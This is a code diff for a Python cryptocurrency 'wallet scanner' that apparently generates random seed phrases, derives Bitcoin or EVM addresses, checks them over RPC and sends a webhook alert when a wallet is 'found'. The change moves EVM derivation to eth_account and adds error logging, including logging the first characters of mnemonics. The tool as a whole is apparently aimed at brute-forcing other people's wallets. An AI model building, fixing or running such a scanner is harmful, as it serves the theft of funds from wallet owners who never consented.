@@ -4,11 +4,10 @@ import logging
 import asyncio
 import aiohttp
 import hashlib
-import base58
 import secrets
 import threading
 from datetime import datetime
-from typing import Dict, List, Optional, Tuple
+from typing import Dict, List, Optional
 from collections import OrderedDict
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
@@ -16,6 +15,10 @@ from mnemonic import Mnemonic
 from bip32utils import BIP32Key
 from eth_keys import keys as EthKeys
 from bech32 import bech32_encode, convertbits
+from eth_account import Account
+
+# Enable HD wallet features (required for mnemonic derivation)
+Account.enable_unaudited_hdwallet_features()
 
 # ---------- Configuration ----------
 BLOCKCHAIN = os.environ.get("BLOCKCHAIN", "ethereum").lower()
@@ -167,7 +170,7 @@ class AlertManager:
                 {"name": "🆔 Wallet ID", "value": str(wallet_id), "inline": True},
                 {"name": "🕐 Found At", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": True}
             ],
-            "footer": {"text": f"Scanner v3.0 | {BLOCKCHAIN.upper()}"},
+            "footer": {"text": f"Scanner v3.1 | {BLOCKCHAIN.upper()}"},
             "timestamp": datetime.utcnow().isoformat()
         }
         async with aiohttp.ClientSession() as session:
@@ -190,10 +193,12 @@ class WalletScanner:
         # RPC endpoint for the current blockchain
         if BLOCKCHAIN == "bitcoin":
             self.rpc_url = None
+            self.coin_type = 0  # for Bitcoin derivation (only used if we keep bip32utils)
         else:
             self.rpc_url = RPC_ENDPOINTS.get(BLOCKCHAIN)
             if not self.rpc_url:
                 raise ValueError(f"No RPC endpoint defined for {BLOCKCHAIN}. Please add to RPC_ENDPOINTS.")
+            self.coin_type = 60  # Standard for all EVM chains
 
     def generate_mnemonic(self):
         try:
@@ -204,41 +209,49 @@ class WalletScanner:
             return None
 
     async def derive_addresses(self, mnemonic: str):
-        try:
-            seed = self.mnemo.to_seed(mnemonic)
-            root_key = BIP32Key.fromEntropy(seed)
-            if BLOCKCHAIN == "bitcoin":
-                coin_type = 0
-            else:
-                # EVM chains use coin_type 60 for Ethereum, but BSC and others also use 60.
-                # For compatibility, we use 60 for all EVM chains listed.
-                coin_type = 60
-            addresses = []
-            for change in (0,):
-                for idx in range(NUM_ADDRESSES):
-                    try:
-                        child_key = root_key \
-                            .ChildKey(44 + 0x80000000) \
-                            .ChildKey(coin_type + 0x80000000) \
-                            .ChildKey(0 + 0x80000000) \
-                            .ChildKey(change) \
-                            .ChildKey(idx)
-                        pubkey = child_key.PublicKey()
-                        if BLOCKCHAIN == "bitcoin":
+        """Derive addresses using eth_account for EVM, bip32utils for Bitcoin."""
+        addresses = []
+        if BLOCKCHAIN == "bitcoin":
+            # Use bip32utils for Bitcoin (same as before, but with error logging)
+            try:
+                seed = self.mnemo.to_seed(mnemonic)
+                root_key = BIP32Key.fromEntropy(seed)
+                for change in (0,):
+                    for idx in range(NUM_ADDRESSES):
+                        try:
+                            child_key = root_key \
+                                .ChildKey(44 + 0x80000000) \
+                                .ChildKey(0 + 0x80000000) \
+                                .ChildKey(0 + 0x80000000) \
+                                .ChildKey(change) \
+                                .ChildKey(idx)
+                            pubkey = child_key.PublicKey()
                             addr = self._native_segwit_address(pubkey)
                             if addr:
                                 addresses.append(addr)
-                        else:
-                            priv = EthKeys.PrivateKey(child_key.PrivateKey())
-                            addr = priv.public_key.to_checksum_address()
-                            addresses.append(addr)
-                    except Exception as e:
-                        logger.debug(f"Failed to derive address at index {idx}: {e}")
-                        continue
-            return list(set(addresses))
-        except Exception as e:
-            logger.error(f"Derivation error: {e}")
-            return []
+                        except Exception as e:
+                            logger.error(f"Bitcoin derivation failed at index {idx}: {e}")
+                            continue
+                return list(set(addresses))
+            except Exception as e:
+                logger.error(f"Bitcoin derivation error for mnemonic {mnemonic[:10]}: {e}")
+                return []
+        else:
+            # EVM: use eth_account with BIP44 path m/44'/60'/0'/change/index
+            try:
+                for change in (0,):
+                    for idx in range(NUM_ADDRESSES):
+                        path = f"m/44'/{self.coin_type}'/0'/{change}/{idx}"
+                        try:
+                            account = Account.from_mnemonic(mnemonic, account_path=path)
+                            addresses.append(account.address)
+                        except Exception as e:
+                            logger.error(f"EVM derivation failed at {path}: {e}")
+                            continue
+                return list(set(addresses))
+            except Exception as e:
+                logger.error(f"EVM derivation error for mnemonic {mnemonic[:10]}: {e}")
+                return []
 
     def _native_segwit_address(self, pubkey):
         try:
@@ -347,6 +360,7 @@ class WalletScanner:
                     continue
 
                 if not addresses:
+                    logger.warning(f"⚠️ No addresses derived for {mnemonic[:10]}... (possible derivation error)")
                     errors += 1
                     if errors > 5:
                         await asyncio.sleep(5)
